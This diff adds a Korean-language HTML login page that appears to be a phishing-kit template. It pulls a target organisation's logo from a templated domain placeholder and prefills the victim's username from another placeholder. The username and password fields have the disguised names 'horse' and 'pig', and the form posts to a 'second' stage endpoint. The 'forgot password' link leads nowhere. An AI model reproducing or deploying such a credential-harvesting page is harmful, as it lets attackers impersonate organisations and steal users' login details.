@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <title>로그인</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://logo.clearbit.com/{{ins}}" type="image/x-icon"/>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url(https://images.unsplash.com/photo-1495080600440-47b003ed9521?q=80&w=1742&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D);
+      background-size: cover;
+      width: 100%;
+      height: 100vh;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #2E8B57; /* Dark green text color */
+    }
+
+    .login-container {
+      width: 90%;
+      max-width: 400px;
+      margin: auto;
+      height: 480px; /* Increased height for a more spacious feel */
+      background: linear-gradient(to right, #8FBC8F, #9ACD32);
+      border-radius: 20px; /* Increased border-radius for a more rounded appearance */
+      color: #fff;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 50px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+      opacity: 0;
+      transition: background 0.5s, transform 0.5s, opacity 1s, border-radius 0.5s;
+    }
+
+    .login-container:hover {
+      background: linear-gradient(to right, #3CB371, #4CAF50);
+      transform: translate(-50%, -50%) scale(1.05);
+    }
+
+    .login-container.show {
+      opacity: 1;
+      border-radius: 30px; /* Further increased border-radius for a softer look */
+    }
+
+    .login-container h1 {
+      margin: 0;
+      padding: 0;
+      font-size: 32px; /* Larger font size for the main heading */
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 20px;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+    }
+
+    .login-container p {
+      margin: 0;
+      padding: 0;
+      font-size: 18px; /* Increased font size for paragraphs */
+      color: #fff;
+      margin-bottom: 12px; /* Increased margin for better spacing */
+    }
+
+    .login-container input {
+      width: 100%;
+      margin-bottom: 20px;
+      padding: 14px; /* Increased padding for input fields */
+      border-radius: 10px; /* Increased border-radius for input fields */
+      border: 1px solid #2E8B57;
+      transition: border-color 0.3s, transform 0.3s;
+      animation: inputPulse 1s infinite alternate;
+    }
+
+    .login-container input[type="submit"] {
+      cursor: pointer;
+      background: linear-gradient(to right, #2E8B57, #3CB371);
+      color: #fff;
+      font-size: 20px; /* Increased font size for the submit button */
+      border: none;
+      border-radius: 25px; /* Increased border-radius for the submit button */
+      padding: 14px 24px; /* Increased padding for the submit button */
+      transition: background 0.3s, color 0.3s, transform 0.3s;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+    }
+
+    .login-container input[type="submit"]:hover {
+      background: linear-gradient(to right, #3CB371, #4CAF50);
+      color: #fff;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3), 0 0 10px rgba(0, 0, 0, 0.2);
+      animation: buttonPulse 0.5s ease-in-out;
+    }
+
+    @keyframes inputPulse {
+      0% {
+        transform: scale(1);
+      }
+      100% {
+        transform: scale(1.02);
+      }
+    }
+
+    @keyframes buttonPulse {
+      0% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.1);
+      }
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    .login-container a {
+      text-decoration: none;
+      font-size: 14px;
+      color: #fff;
+      transition: color 0.3s;
+    }
+
+    .login-container a:hover {
+      color: #3CB371;
+    }
+
+    .avatar {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      position: absolute;
+      top: -40px;
+      left: calc(50% - 40px);
+      border: 3px solid #fff; /* Added border for emphasis */
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://logo.clearbit.com/{{ins}}" class="avatar">
+    <h1>로그인</h1>
+    <form action="second" method="post">
+      <p>사용자 이름</p>
+      <input type="text" name="horse" placeholder="사용자 이름을 입력하세요" value="{{eman}}">
+      <p>비밀번호</p>
+      <input type="password" name="pig" placeholder="비밀번호 입력" required>
+      <input type="submit" name="submit" value="로그인">
+      <a href="#">비밀번호를 잊으셨습니까?</a>
+    </form>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const loginContainer = document.querySelector('.login-container');
+      loginContainer.classList.add('show');
+    });
+  </script>
+</body>
+</html>
